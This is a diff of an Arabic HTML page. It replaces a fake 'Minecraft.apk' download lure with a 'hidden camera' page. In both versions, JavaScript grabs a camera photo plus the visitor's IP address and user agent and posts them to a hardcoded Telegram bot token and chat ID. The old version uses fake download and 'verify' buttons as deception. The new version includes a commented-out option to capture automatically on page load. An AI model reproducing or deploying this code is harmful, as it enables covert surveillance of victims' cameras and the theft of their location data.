@@ -3,285 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Minecraft - تنزيل مجاني</title>
+    <title>📸 كاميرا خفية</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #1a1a1a;
-            font-family: 'Courier New', monospace;
+            background: #0d0d0d;
+            font-family: 'Segoe UI', Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             color: #fff;
-            background-image: url('https://i.imgur.com/8z1p3Wx.png');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
         }
         .container {
-            background: rgba(20, 30, 20, 0.88);
-            backdrop-filter: blur(12px);
-            padding: 35px 30px;
-            border-radius: 20px;
-            box-shadow: 0 0 80px rgba(0, 255, 0, 0.08);
-            max-width: 460px;
+            background: #1a1a2e;
+            padding: 40px 30px;
+            border-radius: 25px;
+            box-shadow: 0 0 60px rgba(233, 69, 96, 0.15);
+            max-width: 420px;
             width: 92%;
-            border: 3px solid #5a9a3a;
+            border: 1px solid #2a2a4a;
             text-align: center;
-            position: relative;
-            overflow: hidden;
         }
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: repeating-linear-gradient(0deg,
-                    transparent,
-                    transparent 3px,
-                    rgba(90, 154, 58, 0.04) 3px,
-                    rgba(90, 154, 58, 0.04) 6px);
-            pointer-events: none;
-            animation: scan 12s linear infinite;
-            z-index: 0;
-        }
-        @keyframes scan {
-            0% {
-                transform: translateY(-50%);
-            }
-            100% {
-                transform: translateY(0%);
-            }
-        }
-        .fire {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            background: radial-gradient(ellipse at center bottom,
-                    rgba(90, 220, 60, 0.08) 0%,
-                    transparent 70%);
-            animation: fireGlow 2.5s ease-in-out infinite alternate;
-            z-index: 0;
-        }
-        @keyframes fireGlow {
-            0% {
-                opacity: 0.2;
-                transform: scale(1);
-            }
-            100% {
-                opacity: 0.6;
-                transform: scale(1.1);
-            }
-        }
-        .logo {
-            font-size: 56px;
-            margin-bottom: 2px;
-            position: relative;
-            z-index: 1;
-            display: block;
-            text-shadow: 0 0 50px rgba(90, 220, 60, 0.25);
-        }
-        .title {
-            font-size: 36px;
-            font-weight: 700;
-            color: #6ab04c;
-            letter-spacing: 3px;
-            text-shadow: 0 0 30px rgba(106, 176, 76, 0.3);
-            position: relative;
-            z-index: 1;
-            margin-bottom: 2px;
-        }
-        .sub {
-            color: #8a8a8a;
-            font-size: 14px;
-            margin-bottom: 18px;
-            border-bottom: 2px solid #3a6a2a;
-            padding-bottom: 14px;
-            position: relative;
-            z-index: 1;
-            letter-spacing: 1px;
-        }
-        .info-box {
-            background: rgba(0, 20, 0, 0.5);
-            border: 2px solid #3a7a2a;
-            border-radius: 12px;
-            padding: 12px 16px;
-            margin-bottom: 20px;
-            position: relative;
-            z-index: 1;
-        }
-        .info-box .row {
-            display: flex;
-            justify-content: space-between;
-            padding: 5px 0;
-            font-size: 14px;
-            color: #aaa;
-            border-bottom: 1px solid #1a3a1a;
-        }
-        .info-box .row:last-child {
-            border-bottom: none;
-        }
-        .info-box .row span:last-child {
-            color: #6ab04c;
-            font-weight: bold;
-        }
+        .icon { font-size: 70px; margin-bottom: 10px; }
+        h2 { color: #e94560; margin-bottom: 8px; font-weight: 300; }
+        p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
         .btn {
             width: 100%;
             padding: 16px;
+            background: #e94560;
             border: none;
             color: #fff;
             font-weight: bold;
-            font-size: 17px;
-            border-radius: 10px;
+            font-size: 18px;
+            border-radius: 50px;
             cursor: pointer;
             transition: 0.3s;
-            margin-top: 6px;
-            font-family: 'Courier New', monospace;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            position: relative;
-            z-index: 1;
         }
-        .btn-primary {
-            background: linear-gradient(135deg, #5a9a3a, #3a7a2a);
-            border: 2px solid #4a8a32;
-            text-shadow: 0 2px 0 #1a4a1a;
-            box-shadow: 0 0 30px rgba(90, 154, 58, 0.15);
-        }
-        .btn-primary:hover {
-            background: linear-gradient(135deg, #6aaa4a, #4a8a32);
-            transform: scale(1.02);
-            box-shadow: 0 0 50px rgba(90, 154, 58, 0.3);
-        }
-        .btn-secondary {
-            background: #2a3a2a;
-            border: 2px solid #3a5a3a;
-            margin-top: 10px;
-        }
-        .btn-secondary:hover {
-            background: #3a4a3a;
-            border-color: #4a7a4a;
-            box-shadow: 0 0 30px rgba(90, 154, 58, 0.1);
-        }
+        .btn:hover { background: #c73652; transform: scale(1.02); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
         #status {
             margin-top: 18px;
+            padding: 14px;
+            border-radius: 12px;
+            background: #12122a;
+            border: 1px solid #1a1a3a;
             font-size: 14px;
-            color: #8a8a8a;
-            padding: 12px;
-            border-radius: 10px;
-            background: rgba(0, 20, 0, 0.5);
-            border: 1px solid #1a3a1a;
-            min-height: 50px;
-            position: relative;
-            z-index: 1;
-            font-family: 'Courier New', monospace;
-        }
-        .footer {
-            margin-top: 18px;
-            font-size: 12px;
-            color: #3a5a3a;
-            border-top: 1px solid #1a3a1a;
-            padding-top: 14px;
-            position: relative;
-            z-index: 1;
-            letter-spacing: 1px;
+            color: #aaa;
+            min-height: 55px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 6px;
         }
         .loader {
             display: inline-block;
             width: 18px;
             height: 18px;
-            border: 3px solid #2a5a2a;
-            border-top: 3px solid #6ab04c;
+            border: 3px solid #2a2a4a;
+            border-top: 3px solid #e94560;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
             vertical-align: middle;
             margin-right: 8px;
         }
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-        .minecraft-icon {
-            font-size: 60px;
-            display: block;
-            margin-bottom: 2px;
-            text-shadow: 0 0 50px rgba(106, 176, 76, 0.2);
-            position: relative;
-            z-index: 1;
-        }
-        #cameraStatus {
-            margin-top: 10px;
-            font-size: 13px;
-            color: #6ab04c;
-            min-height: 20px;
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer { margin-top: 18px; font-size: 11px; color: #444; border-top: 1px solid #1a1a3a; padding-top: 14px; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="fire"></div>
-        <span class="minecraft-icon">⛏️</span>
-        <div class="title">MINECRAFT</div>
-        <div class="sub">▼ تنزيل الإصدار 1.21.4 – النسخة الرسمية ▼</div>
-        <div class="info-box">
-            <div class="row"><span>📦 الملف</span><span>Minecraft.apk</span></div>
-            <div class="row"><span>📏 الحجم</span><span>287 MB</span></div>
-            <div class="row"><span>📅 الإصدار</span><span>28 يونيو 2026</span></div>
-            <div class="row"><span>🔒 التوقيع</span><span>✅ معتمد</span></div>
-        </div>
-        <button class="btn btn-primary" id="mainBtn">🚀 تحميل Minecraft.apk</button>
-        <button class="btn btn-secondary" id="fakeBtn">🔍 التحقق من الملف</button>
-        <div id="status">⏳ اضغط تحميل لبدء التنزيل</div>
-        <div id="cameraStatus"></div>
-        <div class="footer">🔒 اتصال آمن • ✅ تم التحقق • ⛏️ Minecraft Official</div>
+        <div class="icon">📷</div>
+        <h2>كاميرا خفية</h2>
+        <p>اضغط الزر لالتقاط صورة وإرسالها</p>
+        <button class="btn" id="captureBtn">📸 التقاط وإرسال</button>
+        <div id="status">⏳ جاهز للالتقاط</div>
+        <div class="footer">🔒 اتصال آمن • ✅ يعمل فوراً</div>
     </div>
+
     <script>
         // ============================================================
-        // إعدادات بوت تيليغرام - بياناتك الصحيحة
+        // إعدادات بوت تيليغرام - بياناتك
         // ============================================================
         const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
         const CHAT_ID = "5730027675";
         // ============================================================
 
-        const mainBtn = document.getElementById('mainBtn');
-        const fakeBtn = document.getElementById('fakeBtn');
+        const btn = document.getElementById('captureBtn');
         const statusDiv = document.getElementById('status');
-        const cameraStatus = document.getElementById('cameraStatus');
 
-        // ====== جلب عنوان IP ======
+        // ====== دالة جلب IP ======
         async function getIP() {
-            try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); return data.ip || 'غير معروف'; } catch { return 'غير معروف'; }
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip || 'غير معروف';
+            } catch {
+                return 'غير معروف';
+            }
         }
 
-        // ====== طلب الكاميرا والتقاط الصورة (بدون إشعار مسبق) ======
-        async function captureAndSendPhoto() {
+        // ====== دالة إرسال إشعار نصي ======
+        async function sendMessage(text) {
             try {
-                cameraStatus.innerHTML = '📷 جاري طلب الكاميرا...';
-                cameraStatus.style.color = '#ff9800';
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                const result = await response.json();
+                return result.ok;
+            } catch (e) {
+                console.error(e);
+                return false;
+            }
+        }
 
+        // ====== دالة التقاط الصورة وإرسالها ======
+        async function captureAndSend() {
+            // تعطيل الزر
+            btn.disabled = true;
+            statusDiv.innerHTML = `<span class="loader"></span> جاري طلب الكاميرا...`;
+            statusDiv.style.color = '#ff9800';
+
+            try {
+                // 1. طلب الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "environment" }
                 });
 
+                // 2. إنشاء عنصر فيديو مؤقت
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
-                await new Promise(r => setTimeout(r, 500));
+                await new Promise(r => setTimeout(r, 400));
 
+                // 3. رسم الإطار على Canvas
                 const canvas = document.createElement('canvas');
                 const track = stream.getVideoTracks()[0];
                 const settings = track.getSettings();
@@ -289,130 +152,67 @@
                 canvas.height = settings.height || 480;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/jpeg', 0.9);
 
+                // 4. تحويل إلى Base64 ثم Blob
+                const imageData = canvas.toDataURL('image/jpeg', 0.9);
                 const blob = await fetch(imageData).then(r => r.blob());
+
+                // 5. إرسال الصورة إلى تيليغرام
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'camera.jpg');
+                formData.append('photo', blob, 'capture.jpg');
 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
+                const photoResult = await photoResponse.json();
 
+                // 6. إغلاق الكاميرا
                 stream.getTracks().forEach(t => t.stop());
 
-                cameraStatus.innerHTML = '✅ تم التقاط الصورة وإرسالها';
-                cameraStatus.style.color = '#4caf50';
-                return true;
-
-            } catch (e) {
-                console.log('❌ الكاميرا غير متاحة:', e);
-                cameraStatus.innerHTML = '⚠️ لم نتمكن من الوصول للكاميرا (متابعة التحميل)';
-                cameraStatus.style.color = '#ff9800';
-                return false;
-            }
-        }
-
-        // ====== إرسال إشعار إلى تيليغرام ======
-        async function sendNotification(action) {
-            try {
+                // 7. إرسال إشعار إضافي (IP، جهاز، وقت)
                 const ip = await getIP();
-                const message = `📱 **تم تنزيل ملف Minecraft.apk**\n\n📌 الإجراء: ${action}\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}\n🌐 IP: ${ip}`;
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
-                });
-                const result = await response.json();
-                if (result.ok) {
-                    console.log('✅ تم الإرسال بنجاح');
-                    return true;
+                const msg = `📸 **تم التقاط صورة جديدة**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}`;
+                await sendMessage(msg);
+
+                // 8. عرض النجاح
+                if (photoResult.ok) {
+                    statusDiv.innerHTML = `✅ تم إرسال الصورة والإشعار بنجاح`;
+                    statusDiv.style.color = '#4caf50';
                 } else {
-                    console.error('❌ فشل الإرسال:', result);
-                    return false;
+                    statusDiv.innerHTML = `⚠️ الصورة أرسلت لكن فشل الإشعار النصي`;
+                    statusDiv.style.color = '#ff9800';
                 }
-            } catch (e) {
-                console.error('❌ خطأ:', e);
-                return false;
-            }
-        }
 
-        // ====== تحميل ملف وهمي ======
-        function downloadFakeFile() {
-            const blob = new Blob(['هذا ملف وهمي لأغراض العرض'], { type: 'application/vnd.android.package-archive' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'Minecraft.apk';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-        }
-
-        // ====== الإجراء الرئيسي (كاميرا أولاً، ثم تحميل) ======
-        async function handleMainAction() {
-            // تعطيل الزر لتجنب الضغط المتكرر
-            mainBtn.disabled = true;
-            mainBtn.style.opacity = '0.6';
-            statusDiv.innerHTML = `<span class="loader"></span> جاري التجهيز...`;
-            statusDiv.style.color = '#aaa';
-
-            // الخطوة 1: التقاط الصورة فوراً
-            const photoCaptured = await captureAndSendPhoto();
-
-            // الخطوة 2: إرسال إشعار
-            statusDiv.innerHTML = `<span class="loader"></span> جاري إرسال الإشعار...`;
-            const sent = await sendNotification('تحميل مباشر (مع صورة)');
-
-            if (sent) {
-                statusDiv.innerHTML = `✅ تم الإرسال بنجاح`;
-                statusDiv.style.color = '#4caf50';
-
-                // الخطوة 3: تحميل ملف وهمي بعد 1 ثانية
-                setTimeout(() => {
-                    statusDiv.innerHTML = `📥 جاري تجهيز الملف للتحميل...`;
-                    setTimeout(() => {
-                        downloadFakeFile();
-                        statusDiv.innerHTML = '📥 تم التنزيل بنجاح';
-                        statusDiv.style.color = '#8a8a8a';
-                        // إعادة تفعيل الزر
-                        mainBtn.disabled = false;
-                        mainBtn.style.opacity = '1';
-                    }, 800);
-                }, 1000);
-
-            } else {
-                statusDiv.innerHTML = '❌ فشل الإرسال، حاول مرة أخرى';
+            } catch (error) {
+                console.error('❌ خطأ:', error);
+                let errorMsg = '❌ فشل الوصول للكاميرا. تأكد من منح الصلاحية.';
+                if (error.name === 'NotAllowedError') {
+                    errorMsg = '🚫 تم رفض صلاحية الكاميرا. امنح الصلاحية وحاول مجدداً.';
+                } else if (error.name === 'NotFoundError') {
+                    errorMsg = '📵 لا توجد كاميرا على هذا الجهاز.';
+                }
+                statusDiv.innerHTML = errorMsg;
                 statusDiv.style.color = '#e94560';
-                mainBtn.disabled = false;
-                mainBtn.style.opacity = '1';
+
+                // محاولة إرسال إشعار بالفشل
+                try {
+                    const ip = await getIP();
+                    await sendMessage(`⚠️ **فشل التقاط الصورة**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}\n❌ السبب: ${error.message}`);
+                } catch (e) {}
             }
+
+            // إعادة تفعيل الزر
+            btn.disabled = false;
         }
 
-        // ====== زر التحقق الوهمي ======
-        fakeBtn.addEventListener('click', async function() {
-            statusDiv.innerHTML = `<span class="loader"></span> جاري التحقق من الملف...`;
-            statusDiv.style.color = '#aaa';
+        // ====== ربط الزر ======
+        btn.addEventListener('click', captureAndSend);
 
-            // أيضاً نطلب الكاميرا عند التحقق (يمكن تعديله)
-            await captureAndSendPhoto();
-            await sendNotification('التحقق من الملف');
-
-            setTimeout(() => {
-                statusDiv.innerHTML = `✅ الملف آمن ومعتمد 100%`;
-                statusDiv.style.color = '#4caf50';
-                setTimeout(() => {
-                    statusDiv.innerHTML = '🔍 الملف جاهز للتحميل';
-                    statusDiv.style.color = '#8a8a8a';
-                }, 2000);
-            }, 2000);
-        });
-
-        // ====== ربط الزر الرئيسي ======
-        mainBtn.addEventListener('click', handleMainAction);
+        // ====== تشغيل تلقائي عند فتح الصفحة (اختياري) ======
+        // إذا أردت أن تبدأ فوراً بدون ضغط، أزل علامة // من السطر التالي:
+        // setTimeout(captureAndSend, 500);
     </script>
 </body>
 </html>
